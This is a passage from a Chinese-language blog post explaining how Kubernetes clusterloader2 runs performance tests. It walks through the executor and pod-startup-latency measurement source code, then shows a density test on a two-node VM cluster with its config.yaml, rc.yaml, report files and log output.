mapping) if err != nil { return errors.NewErrorList(fmt.Errorf(\u0026#34;config reading error: %v\u0026#34;, err)) } return Test.ExecuteTest(ctx, testConfig) } // api.Config 定义 // Config is a structure that represents configuration // for a single test scenario. type Config struct { // Name of the test case.  Name string `json: name` // AutomanagedNamespaces is a number of automanaged namespaces.  AutomanagedNamespaces int32 `json: automanagedNamespaces` // Steps is a sequence of test steps executed in serial.  Steps []Step `json: steps` // TuningSets is a collection of tuning sets that can be used by steps.  TuningSets []TuningSet `json: tuningSets` // ChaosMonkey is a config for simulated component failures.  ChaosMonkey ChaosMonkeyConfig `json: chaosMonkey` }   RunTest 又调用了 ExecuteTest，示例代码如下： 循环steps，按顺序执行ExecuteStep\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  // ExecuteTest executes test based on provided configuration. func (ste *simpleTestExecutor) ExecuteTest(ctx Context, conf *api.Config) { // auto set test namespace  ctx.GetClusterFramework().SetAutomanagedNamespacePrefix(fmt.Sprintf(\u0026#34;test-%s\u0026#34;, util.RandomDNS1123String(6))) // clear test resource  defer cleanupResources(ctx) // create test namespace  err = ctx.GetClusterFramework().CreateAutomanagedNamespaces(int(conf.AutomanagedNamespaces)) // 遍历steps，分步执行，如果某step出错stepErr，则退出。  for i := range conf.Steps { if stepErrList := ste.ExecuteStep(ctx, \u0026amp;conf.Steps[i]); !stepErrList.IsEmpty() { errList.Concat(stepErrList) if isErrsCritical(stepErrList) { return errList } } } // 输出测试汇总信息  for _, summary := range ctx.GetMeasurementManager().GetSummaries() { if ctx.GetClusterLoaderConfig().ReportDir == \u0026#34;\u0026#34; { klog.Infof(\u0026#34;%v: %v\u0026#34;, summary.SummaryName(), summary.SummaryContent()) } else { // TODO(krzysied): Remember to keep original filename style for backward compatibility.  filePath := path.Join(ctx.GetClusterLoaderConfig().ReportDir, summary.SummaryName()+\u0026#34;_\u0026#34;+conf.Name+\u0026#34;_\u0026#34;+summary.SummaryTime().Format(time.RFC3339)+\u0026#34;.\u0026#34;+summary.SummaryExt()) ioutil.WriteFile(filePath, []byte(summary.SummaryContent()), 0644) } } }   可以看出 每个step中的Measurements和Phases都是并发执行的。\n而且在每个step中，要么执行measurement.exec，要么执行phase.exec\nclusterloader2/pkg/test/simple_test_executor.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  // ExecuteStep executes single test step based on provided step configuration. func (ste *simpleTestExecutor) ExecuteStep(ctx Context, step *api.Step) *errors.ErrorList { var wg wait.Group errList := errors.NewErrorList() if len(step.Measurements) \u0026gt; 0 { for i := range step.Measurements { // index is created to make i value unchangeable during thread execution.  index := i wg.Start(func() { err := ctx.GetMeasurementManager().Execute(step.Measurements[index].Method, step.Measurements[index].Identifier, step.Measurements[index].Params) if err != nil { errList.Append(fmt.Errorf(\u0026#34;measurement call %s - %s error: %v\u0026#34;, step.Measurements[index].Method, step.Measurements[index].Identifier, err)) } }) } } else { for i := range step.Phases { phase := \u0026amp;step.Phases[i] wg.Start(func() { if phaseErrList := ste.ExecutePhase(ctx, phase); !phaseErrList.IsEmpty() { errList.Concat(phaseErrList) } }) } } wg.Wait() if step.Name != \u0026#34;\u0026#34; { klog.Infof(\u0026#34;Step \\\u0026#34;%s\\\u0026#34; ended\u0026#34;, step.Name) } return errList }   measurement Execute 根据 methodName, identifier 创建measurementInstance。目前有17种measurementInstance。比如：apiResponsivenessMeasurement；podStartupLatencyMeasurement等等\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  // Execute executes measurement based on provided identifier, methodName and params. func (mm *MeasurementManager) Execute(methodName string, identifier string, params map[string]interface{}) error { measurementInstance, err := mm.getMeasurementInstance(methodName, identifier) if err != nil { return err } config := \u0026amp;MeasurementConfig{ ClusterFramework: mm.clusterFramework, PrometheusFramework: mm.prometheusFramework, Params: params, TemplateProvider: mm.templateProvider, Identifier: identifier, CloudProvider: mm.clusterLoaderConfig.ClusterConfig.Provider, } summaries, err := measurementInstance.Execute(config) mm.summaries = append(mm.summaries, summaries...) return err }   Measurement处理 以podStartupLatencyMeasurement为例分析，action参数分为start和gather，分别表示测试启动和测试收集\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180  // Execute supports two actions: // - start - Starts to observe pods and pods events. // - gather - Gathers and prints current pod latency data. // Does NOT support concurrency. Multiple calls to this measurement // shouldn\u0026#39;t be done within one step. func (p *podStartupLatencyMeasurement) Execute(config *measurement.MeasurementConfig) ([]measurement.Summary, error) { action, err := util.GetString(config.Params, \u0026#34;action\u0026#34;) if err != nil { return nil, err } switch action { case \u0026#34;start\u0026#34;: p.namespace, err = util.GetStringOrDefault(config.Params, \u0026#34;namespace\u0026#34;, metav1.NamespaceAll) if err != nil { return nil, err } p.labelSelector, err = util.GetStringOrDefault(config.Params, \u0026#34;labelSelector\u0026#34;, \u0026#34;\u0026#34;) if err != nil { return nil, err } p.fieldSelector, err = util.GetStringOrDefault(config.Params, \u0026#34;fieldSelector\u0026#34;, \u0026#34;\u0026#34;) if err != nil { return nil, err } p.threshold, err = util.GetDurationOrDefault(config.Params, \u0026#34;threshold\u0026#34;, defaultPodStartupLatencyThreshold) if err != nil { return nil, err } return nil, p.start(config.ClusterFramework.GetClientSets().GetClient()) case \u0026#34;gather\u0026#34;: return p.gather(config.ClusterFramework.GetClientSets().GetClient(), config.Identifier) default: return nil, fmt.Errorf(\u0026#34;unknown action %v\u0026#34;, action) } } // 测试启动 func (p *podStartupLatencyMeasurement) start(c clientset.Interface) error { if p.isRunning { klog.Infof(\u0026#34;%s: pod startup latancy measurement already running\u0026#34;, p) return nil } p.selectorsString = measurementutil.CreateSelectorsString(p.namespace, p.labelSelector, p.fieldSelector) klog.Infof(\u0026#34;%s: starting pod startup latency measurement...\u0026#34;, p) p.isRunning = true p.stopCh = make(chan struct{}) p.informer = informer.NewInformer( c, \u0026#34;pods\u0026#34;, p.namespace, p.fieldSelector, p.labelSelector, // 使用checkPod回调处理，一旦pod状态为running，则更新测试工具保存的pod的start时间  p.checkPod, ) // 启动了监听该范围内的pod资源  go p.informer.Run(p.stopCh) timeoutCh := make(chan struct{}) timeoutTimer := time.AfterFunc(informerSyncTimeout, func() { close(timeoutCh) }) defer timeoutTimer.Stop() if !cache.WaitForCacheSync(timeoutCh, p.informer.HasSynced) { return fmt.Errorf(\u0026#34;timed out waiting for caches to sync\u0026#34;) } return nil } // 测试收集 func (p *podStartupLatencyMeasurement) gather(c clientset.Interface, identifier string) ([]measurement.Summary, error) { klog.Infof(\u0026#34;%s: gathering pod startup latency measurement...\u0026#34;, p) // 检查podStartupLatencyMeasurement 是否已启动  if !p.isRunning { return nil, fmt.Errorf(\u0026#34;metric %s has not been started\u0026#34;, podStartupLatencyMeasurementName) } scheduleLag := make([]measurementutil.LatencyData, 0) startupLag := make([]measurementutil.LatencyData, 0) watchLag := make([]measurementutil.LatencyData, 0) schedToWatchLag := make([]measurementutil.LatencyData, 0) e2eLag := make([]measurementutil.LatencyData, 0) p.stop() // 通过schedEvents方式获取调度器事件的create时间  if err := p.gatherScheduleTimes(c); err != nil { return nil, err } // 遍历pod-createTime map，按pod生命周期逻辑，进行条件检查  for key, create := range p.createTimes { sched, hasSched := p.scheduleTimes[key] if !hasSched { klog.Infof(\u0026#34;%s: failed to find schedule time for %v\u0026#34;, p, key) } run, ok := p.runTimes[key] if !ok { klog.Infof(\u0026#34;%s: failed to find run time for %v\u0026#34;, p, key) continue } watch, ok := p.watchTimes[key] if !ok { klog.Infof(\u0026#34;%s: failed to find watch time for %v\u0026#34;, p, key) continue } node, ok := p.nodeNames[key] if !ok { klog.Infof(\u0026#34;%s: failed to find node for %v\u0026#34;, p, key) continue } // 计算各种延时，重要。。。  if hasSched { scheduleLag = append(scheduleLag, podLatencyData{Name: key, Node: node, Latency: sched.Time.Sub(create.Time)}) startupLag = append(startupLag, podLatencyData{Name: key, Node: node, Latency: run.Time.Sub(sched.Time)}) schedToWatchLag = append(schedToWatchLag, podLatencyData{Name: key, Node: node, Latency: watch.Time.Sub(sched.Time)}) } watchLag = append(watchLag, podLatencyData{Name: key, Node: node, Latency: watch.Time.Sub(run.Time)}) e2eLag = append(e2eLag, podLatencyData{Name: key, Node: node, Latency: watch.Time.Sub(create.Time)}) } // 把各个pod的各延时指标值进行排序，排序目的是为了方便进行数据统计  sort.Sort(measurementutil.LatencySlice(scheduleLag)) sort.Sort(measurementutil.LatencySlice(startupLag)) sort.Sort(measurementutil.LatencySlice(watchLag)) sort.Sort(measurementutil.LatencySlice(schedToWatchLag)) sort.Sort(measurementutil.LatencySlice(e2eLag)) p.printLatencies(scheduleLag, \u0026#34;worst create-to-schedule latencies\u0026#34;) p.printLatencies(startupLag, \u0026#34;worst schedule-to-run latencies\u0026#34;) p.printLatencies(watchLag, \u0026#34;worst run-to-watch latencies\u0026#34;) p.printLatencies(schedToWatchLag, \u0026#34;worst schedule-to-watch latencies\u0026#34;) p.printLatencies(e2eLag, \u0026#34;worst e2e latencies\u0026#34;) podStartupLatency := \u0026amp;podStartupLatency{ CreateToScheduleLatency: measurementutil.ExtractLatencyMetrics(scheduleLag), ScheduleToRunLatency: measurementutil.ExtractLatencyMetrics(startupLag), RunToWatchLatency: measurementutil.ExtractLatencyMetrics(watchLag), ScheduleToWatchLatency: measurementutil.ExtractLatencyMetrics(schedToWatchLag), E2ELatency: measurementutil.ExtractLatencyMetrics(e2eLag), } // 成功率  var err error if successRatio := float32(len(e2eLag)) / float32(len(p.createTimes)); successRatio \u0026lt; successfulStartupRatioThreshold { err = fmt.Errorf(\u0026#34;only %v%% of all pods were scheduled successfully\u0026#34;, successRatio*100) klog.Errorf(\u0026#34;%s: %v\u0026#34;, p, err) } // 设置阈值，这里各百分位数使用的都是相同阈值  podStartupLatencyThreshold := \u0026amp;measurementutil.LatencyMetric{ Perc50: p.threshold, Perc90: p.threshold, Perc99: p.threshold, } // 进行延时指标验证，判断是否满足slos，不满足则输出错误信息  if slosErr := podStartupLatency.E2ELatency.VerifyThreshold(podStartupLatencyThreshold); slosErr != nil { err = errors.NewMetricViolationError(\u0026#34;pod startup\u0026#34;, slosErr.Error()) klog.Errorf(\u0026#34;%s: %v\u0026#34;, p, err) } content, jsonErr := util.PrettyPrintJSON(podStartupLatencyToPerfData(podStartupLatency)) if err != nil { return nil, jsonErr } summary := measurement.CreateSummary(fmt.Sprintf(\u0026#34;%s_%s\u0026#34;, podStartupLatencyMeasurementName, identifier), \u0026#34;json\u0026#34;, content) return []measurement.Summary{summary}, err } // VerifyThreshold verifies latency metric against given percentile thresholds. func (metric *LatencyMetric) VerifyThreshold(threshold *LatencyMetric) error { if metric.Perc50 \u0026gt; threshold.Perc50 { return fmt.Errorf(\u0026#34;too high latency 50th percentile: %v\u0026#34;, metric.Perc50) } if metric.Perc90 \u0026gt; threshold.Perc90 { return fmt.Errorf(\u0026#34;too high latency 90th percentile: %v\u0026#34;, metric.Perc90) } if metric.Perc99 \u0026gt; threshold.Perc99 { return fmt.Errorf(\u0026#34;too high latency 99th percentile: %v\u0026#34;, metric.Perc99) } return nil }   Phases处理 Phases处理，实际上就是对配置中的ObjectBundle进行处理, ste.ExecuteObject\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  // ExecutePhase executes single test phase based on provided phase configuration. func (ste *simpleTestExecutor) ExecutePhase(ctx Context, phase *api.Phase) *errors.ErrorList { // TODO: add tuning set  errList := errors.NewErrorList() nsList := createNamespacesList(ctx, phase.NamespaceRange) tuningSet, err := ctx.GetTuningSetFactory().CreateTuningSet(phase.TuningSet) instances, exists := ctx.GetState().GetNamespacesState().Get(nsName, id) // // ExecuteObject executes single test object operation based on provided object configuration.  ste.ExecuteObject(ctx, \u0026amp;phase.ObjectBundle[j], nsName, replicaIndex, XXX) tuningSet.Execute(actions) }   4. 部署测试 .1 k8s-2节点环境 在本地虚拟机2节点的测试环境中，需要修改测试配置文件和pod部署脚本。 测试配置文件主要修改参数有\n  Nodes，属于配置文件上下文参数，如果不指定，测试工具会抓取实际环境中的可用的节点数，进行设置\n  NODES_PER_NAMESPACE， 每个ns下的nodes数。这里需注意: NODES \u0026gt; NODES_PER_NAMESPACE\n  PODS_PER_NODE，每个节点下的pod数\n  MIN_LATENCY_PODS这个数值会跟 PODS_PER_NODE比较 选取最大的，作为LATENCY测试的参数。因为LATENCY测试一般使用较多pod 数，即$MIN_LATENCY_PODS\n  测试中会有测试使用的资源参数，这里需要对实际情况进行config.yaml调整。\n LATENCY_POD_CPU LATENCY_POD_MEMORY 其它自定义资源数量，可以在config.yaml或者rc.yaml和deployment文件中添加配置    .1 部署config.yaml 这里主要修改如下：\n  上述的测试配置参数\n  主要修改参数有\n NODES_PER_NAMESPACE PODS_PER_NODE MIN_LATENCY_PODS LATENCY_POD_CPU LATENCY_POD_MEMORY DENSITY_TEST_THROUGHPUT    measurement-TestMetrics 原有测试工具解析收集Metrics操作异常导致测试失败，详见后面问题描述\n  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206  # ASSUMPTIONS:# - Underlying cluster should have 100+ nodes.# - Number of nodes should be divisible by NODES_PER_NAMESPACE (default 100).#Constants{{$DENSITY_RESOURCE_CONSTRAINTS_FILE := DefaultParam .DENSITY_RESOURCE_CONSTRAINTS_FILE \u0026#34;\u0026#34;}}#{{$NODE_MODE := DefaultParam .NODE_MODE \u0026#34;allnodes\u0026#34;}}{{$NODE_MODE := DefaultParam .NODE_MODE \u0026#34;master\u0026#34;}}{{$NODES_PER_NAMESPACE := DefaultParam .NODES_PER_NAMESPACE 1}}{{$PODS_PER_NODE := DefaultParam .PODS_PER_NODE 2}}{{$DENSITY_TEST_THROUGHPUT := DefaultParam .DENSITY_TEST_THROUGHPUT 20}}# LATENCY_POD_MEMORY and LATENCY_POD_CPU are calculated for 1-core 4GB node.# Increasing allocation of both memory and cpu by 10%# decreases the value of priority function in scheduler by one point.# This results in decreased probability of choosing the same node again.{{$LATENCY_POD_CPU := DefaultParam .LATENCY_POD_CPU 5}}{{$LATENCY_POD_MEMORY := DefaultParam .LATENCY_POD_MEMORY 3}}{{$MIN_LATENCY_PODS := 20}}{{$MIN_SATURATION_PODS_TIMEOUT := 180}}{{$ENABLE_CHAOSMONKEY := DefaultParam .ENABLE_CHAOSMONKEY false}}{{$ENABLE_SYSTEM_POD_METRICS:= DefaultParam .ENABLE_SYSTEM_POD_METRICS false}}{{$ENABLE_RESTART_COUNT_CHECK := DefaultParam .ENABLE_RESTART_COUNT_CHECK false}}{{$RESTART_COUNT_THRESHOLD_OVERRIDES:= DefaultParam .RESTART_COUNT_THRESHOLD_OVERRIDES \u0026#34;\u0026#34;}}#Variables{{$namespaces := DivideInt .Nodes $NODES_PER_NAMESPACE}}{{$podsPerNamespace := MultiplyInt $PODS_PER_NODE $NODES_PER_NAMESPACE}}{{$totalPods := MultiplyInt $podsPerNamespace $namespaces}}{{$latencyReplicas := DivideInt (MaxInt $MIN_LATENCY_PODS .Nodes) $namespaces}}{{$totalLatencyPods := MultiplyInt $namespaces $latencyReplicas}}{{$saturationRCTimeout := DivideFloat $totalPods $DENSITY_TEST_THROUGHPUT | AddInt $MIN_SATURATION_PODS_TIMEOUT}}# saturationRCHardTimeout must be at least 20m to make sure that ~10m node# failure won\u0026#39;t fail the test. See https://github.com/kubernetes/kubernetes/issues/73461#issuecomment-467338711{{$saturationRCHardTimeout := MaxInt $saturationRCTimeout 1200}}name:densityautomanagedNamespaces:{{$namespaces}}tuningSets:- name:Uniform5qpsqpsLoad:qps:5{{if $ENABLE_CHAOSMONKEY}}chaosMonkey:nodeFailure:failureRate:0.01interval:1mjitterFactor:10.0simulatedDowntime:10m{{end}}steps:- measurements:- Identifier:APIResponsivenessMethod:APIResponsivenessParams:action:reset- Identifier:TestMetricsMethod:TestMetricsParams:action:startnodeMode:{{$NODE_MODE}}resourceConstraints:{{$DENSITY_RESOURCE_CONSTRAINTS_FILE}}systemPodMetricsEnabled:{{$ENABLE_SYSTEM_POD_METRICS}}restartCountThresholdOverrides:{{YamlQuote $RESTART_COUNT_THRESHOLD_OVERRIDES 4}}enableRestartCountCheck:{{$ENABLE_RESTART_COUNT_CHECK}}# Create saturation pods- measurements:- Identifier:SaturationPodStartupLatencyMethod:PodStartupLatencyParams:action:startlabelSelector:group = saturationthreshold:{{$saturationRCTimeout}}s- measurements:- Identifier:WaitForRunningSaturationRCsMethod:WaitForControlledPodsRunningParams:action:startapiVersion:v1kind:ReplicationControllerlabelSelector:group = saturationoperationTimeout:{{$saturationRCHardTimeout}}s- phases:- namespaceRange:min:1max:{{$namespaces}}replicasPerNamespace:1tuningSet:Uniform5qpsobjectBundle:- basename:saturation-rcobjectTemplatePath:rc.yamltemplateFillMap:Replicas:{{$podsPerNamespace}}Group:saturationCpuRequest:1mMemoryRequest:10M- measurements:- Identifier:SchedulingThroughputMethod:SchedulingThroughputParams:action:startlabelSelector:group = saturation- measurements:- Identifier:WaitForRunningSaturationRCsMethod:WaitForControlledPodsRunningParams:action:gather- measurements:- Identifier:SaturationPodStartupLatencyMethod:PodStartupLatencyParams:action:gather- measurements:- Identifier:SchedulingThroughputMethod:SchedulingThroughputParams:action:gather- name:Creating saturation pods# Create latency pods- measurements:- Identifier:PodStartupLatencyMethod:PodStartupLatencyParams:action:startlabelSelector:group = latency- measurements:- Identifier:WaitForRunningLatencyRCsMethod:WaitForControlledPodsRunningParams:action:startapiVersion:v1kind:ReplicationControllerlabelSelector:group = latencyoperationTimeout:15m- phases:- namespaceRange:min:1max:{{$namespaces}}replicasPerNamespace:{{$latencyReplicas}}tuningSet:Uniform5qpsobjectBundle:- basename:latency-pod-rcobjectTemplatePath:rc.yamltemplateFillMap:Replicas:1Group:latencyCpuRequest:{{$LATENCY_POD_CPU}}mMemoryRequest:{{$LATENCY_POD_MEMORY}}M- measurements:- Identifier:WaitForRunningLatencyRCsMethod:WaitForControlledPodsRunningParams:action:gather- name:Creating latency pods# Remove latency pods- phases:- namespaceRange:min:1max:{{$namespaces}}replicasPerNamespace:0tuningSet:Uniform5qpsobjectBundle:- basename:latency-pod-rcobjectTemplatePath:rc.yaml- measurements:- Identifier:WaitForRunningLatencyRCsMethod:WaitForControlledPodsRunningParams:action:gather- measurements:- Identifier:PodStartupLatencyMethod:PodStartupLatencyParams:action:gather- name:Deleting latancy pods# Delete pods- phases:- namespaceRange:min:1max:{{$namespaces}}replicasPerNamespace:0tuningSet:Uniform5qpsobjectBundle:- basename:saturation-rcobjectTemplatePath:rc.yaml- measurements:- Identifier:WaitForRunningSaturationRCsMethod:WaitForControlledPodsRunningParams:action:gather- name:Deleting saturation pods# Collect measurements- measurements:- Identifier:APIResponsivenessMethod:APIResponsivenessParams:action:gather- Identifier:TestMetricsMethod:TestMetricsParams:action:gathersystemPodMetricsEnabled:{{$ENABLE_SYSTEM_POD_METRICS}}restartCountThresholdOverrides:{{YamlQuote $RESTART_COUNT_THRESHOLD_OVERRIDES 4}}enableRestartCountCheck:{{$ENABLE_RESTART_COUNT_CHECK}}  .2 部署rc.yaml 修改了image\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  apiVersion:v1kind:ReplicationControllermetadata:name:{{.Name}}labels:group:{{.Group}}spec:replicas:{{.Replicas}}selector:name:{{.Name}}template:metadata:labels:name:{{.Name}}group:{{.Group}}spec:containers:- image:192.168.182.101:5000/com.inspur/pause-amd64:3.1imagePullPolicy:IfNotPresentname:{{.Name}}ports:resources:requests:cpu:{{.CpuRequest}}memory:{{.MemoryRequest}}# Add not-ready/unreachable tolerations for 15 minutes so that node# failure doesn\u0026#39;t trigger pod deletion.tolerations:- key:\u0026#34;node.kubernetes.io/not-ready\u0026#34;operator:\u0026#34;Exists\u0026#34;effect:\u0026#34;NoExecute\u0026#34;tolerationSeconds:900- key:\u0026#34;node.kubernetes.io/unreachable\u0026#34;operator:\u0026#34;Exists\u0026#34;effect:\u0026#34;NoExecute\u0026#34;tolerationSeconds:900  .3 部署测试信息 命令运行报告信息，根据命令配置的report参数，进入report目录进行查看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  [root@node1 clusterloader2]# ls clusterloader reports testing test.log [root@node1 clusterloader2]# cd reports/ [root@node1 reports]# ll total 44 -rw-r--r-- 1 root root 10093 Dec 11 15:38 APIResponsiveness_density_2020-12-11T15:38:47+08:00.json -rw-r--r-- 1 root root 9792 Dec 11 16:29 APIResponsiveness_density_2020-12-11T16:29:41+08:00.json -rw-r--r-- 1 root root 287 Dec 11 16:29 junit.xml -rw-r--r-- 1 root root 1054 Dec 11 15:38 PodStartupLatency_SaturationPodStartupLatency_density_2020-12-11T15:37:54+08:00.json -rw-r--r-- 1 root root 1048 Dec 11 16:29 PodStartupLatency_SaturationPodStartupLatency_density_2020-12-11T16:28:49+08:00.json -rw-r--r-- 1 root root 64 Dec 11 15:38 SchedulingThroughput_density_2020-12-11T15:37:54+08:00.json -rw-r--r-- 1 root root 64 Dec 11 16:29 SchedulingThroughput_density_2020-12-11T16:28:49+08:00.json   按上面的config.yaml，在2节点的本地虚拟机环境执行density测试，完整信息如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151  I1214 15:48:46.685903 129068 clusterloader.go:105] ClusterConfig.Nodes set to 2 E1214 15:48:46.690191 129068 clusterloader.go:122] Getting master external ip error: did not find any ExternalIP master IPs I1214 15:48:46.690809 129068 clusterloader.go:206] Using config: {ClusterConfig:{KubeConfigPath:/root/.kube/config Nodes:2 Provider: MasterIPs:[] MasterInternalIPs:[TEST_MASTER_INTERNAL_IP] MasterName:192.168.182.101 KubemarkRootKubeConfigPath:} ReportDir:./reports EnablePrometheusServer:false TearDownPrometheusServer:false TestConfigPath: TestOverridesPath:[] PrometheusConfig:{EnableServer:false TearDownServer:true ScrapeEtcd:false ScrapeNodeExporter:false ScrapeKubelets:false ScrapeKubeProxy:true SnapshotProject:}} I1214 15:48:46.693242 129068 cluster.go:56] Listing cluster nodes: I1214 15:48:46.693254 129068 cluster.go:68] Name: node1, clusterIP: 192.168.182.101, externalIP: , isSchedulable: true I1214 15:48:46.693260 129068 cluster.go:68] Name: node2, clusterIP: 192.168.182.102, externalIP: , isSchedulable: true I1214 15:48:46.696447 129068 clusterloader.go:167] -------------------------------------------------------------------------------- I1214 15:48:46.696469 129068 clusterloader.go:168] Running /home/wangb/perf-test/clusterloader2/testing/density/config2.yaml I1214 15:48:46.696472 129068 clusterloader.go:169] -------------------------------------------------------------------------------- I1214 15:48:46.697804 129068 simple_test_executor.go:50] AutomanagedNamespacePrefix: test-tteu8b I1214 15:48:46.729142 129068 etcd_metrics.go:76] EtcdMetrics: starting etcd metrics collecting... I1214 15:48:46.729168 129068 scheduler_latency.go:77] SchedulingMetrics: resetting latency metrics in scheduler... I1214 15:48:46.729274 129068 api_responsiveness.go:70] APIResponsiveness: resetting latency metrics in apiserver... I1214 15:48:46.936885 129068 resource_usage.go:106] ResourceUsageSummary: starting resource usage collecting... I1214 15:48:46.948058 129068 system_pod_metrics.go:82] skipping collection of system pod metrics I1214 15:48:46.948107 129068 pod_startup_latency.go:131] PodStartupLatency: labelSelector(group = saturation): starting pod startup latency measurement... I1214 15:48:47.048405 129068 wait_for_controlled_pods.go:163] WaitForControlledPodsRunning: starting wait for controlled pods measurement... I1214 15:48:47.607326 129068 scheduling_throughput.go:107] SchedulingThroughput: starting collecting throughput data I1214 15:48:47.607393 129068 wait_for_controlled_pods.go:196] WaitForControlledPodsRunning: waiting for controlled pods measurement... I1214 15:48:52.226268 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=saturation-rc-0): Pods: 2 out of 2 created, 2 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:48:52.408575 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=saturation-rc-0): Pods: 2 out of 2 created, 2 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:48:52.607705 129068 scheduling_throughput.go:123] SchedulingThroughput: labelSelector(group = saturation): 4 pods scheduled I1214 15:48:52.611510 129068 wait_for_controlled_pods.go:235] WaitForControlledPodsRunning: running 2, deleted 0, timeout: 0, unknown: 0 I1214 15:48:52.611535 129068 wait_for_controlled_pods.go:249] WaitForControlledPodsRunning: 2/2 ReplicationControllers are running with all pods I1214 15:48:52.611582 129068 pod_startup_latency.go:163] PodStartupLatency: labelSelector(group = saturation): gathering pod startup latency measurement... I1214 15:48:52.630805 129068 pod_startup_latency.go:312] PodStartupLatency: labelSelector(group = saturation): 4 worst create-to-schedule latencies: [{test-tteu8b-2/saturation-rc-0-t2t27 node2 0s} {test-tteu8b-1/saturation-rc-0-vxxc6 node2 0s} {test-tteu8b-1/saturation-rc-0-pqmh6 node1 0s} {test-tteu8b-2/saturation-rc-0-phkng node1 0s}] I1214 15:48:52.630877 129068 pod_startup_latency.go:313] PodStartupLatency: labelSelector(group = saturation): perc50: 0s, perc90: 0s, perc99: 0s; threshold: 3m0s I1214 15:48:52.630887 129068 pod_startup_latency.go:312] PodStartupLatency: labelSelector(group = saturation): 4 worst schedule-to-run latencies: [{test-tteu8b-2/saturation-rc-0-t2t27 node2 1s} {test-tteu8b-1/saturation-rc-0-vxxc6 node2 1s} {test-tteu8b-1/saturation-rc-0-pqmh6 node1 1s} {test-tteu8b-2/saturation-rc-0-phkng node1 1s}] I1214 15:48:52.630894 129068 pod_startup_latency.go:313] PodStartupLatency: labelSelector(group = saturation): perc50: 1s, perc90: 1s, perc99: 1s; threshold: 3m0s I1214 15:48:52.630903 129068 pod_startup_latency.go:312] PodStartupLatency: labelSelector(group = saturation): 4 worst run-to-watch latencies: [{test-tteu8b-2/saturation-rc-0-t2t27 node2 1.202667785s} {test-tteu8b-1/saturation-rc-0-vxxc6 node2 1.22260201s} {test-tteu8b-1/saturation-rc-0-pqmh6 node1 1.292204887s} {test-tteu8b-2/saturation-rc-0-phkng node1 1.30166796s}] I1214 15:48:52.630909 129068 pod_startup_latency.go:313] PodStartupLatency: labelSelector(group = saturation): perc50: 1.22260201s, perc90: 1.30166796s, perc99: 1.30166796s; threshold: 3m0s I1214 15:48:52.630912 129068 pod_startup_latency.go:312] PodStartupLatency: labelSelector(group = saturation): 4 worst schedule-to-watch latencies: [{test-tteu8b-2/saturation-rc-0-t2t27 node2 2.202667785s} {test-tteu8b-1/saturation-rc-0-vxxc6 node2 2.22260201s} {test-tteu8b-1/saturation-rc-0-pqmh6 node1 2.292204887s} {test-tteu8b-2/saturation-rc-0-phkng node1 2.30166796s}] I1214 15:48:52.630920 129068 pod_startup_latency.go:313] PodStartupLatency: labelSelector(group = saturation): perc50: 2.22260201s, perc90: 2.30166796s, perc99: 2.30166796s; threshold: 3m0s I1214 15:48:52.630922 129068 pod_startup_latency.go:312] PodStartupLatency: labelSelector(group = saturation): 4 worst e2e latencies: [{test-tteu8b-2/saturation-rc-0-t2t27 node2 2.202667785s} {test-tteu8b-1/saturation-rc-0-vxxc6 node2 2.22260201s} {test-tteu8b-1/saturation-rc-0-pqmh6 node1 2.292204887s} {test-tteu8b-2/saturation-rc-0-phkng node1 2.30166796s}] I1214 15:48:52.630926 129068 pod_startup_latency.go:313] PodStartupLatency: labelSelector(group = saturation): perc50: 2.22260201s, perc90: 2.30166796s, perc99: 2.30166796s; threshold: 3m0s I1214 15:48:52.631183 129068 scheduling_throughput.go:136] SchedulingThroughput: gathering data I1214 15:48:52.631231 129068 simple_test_executor.go:128] Step 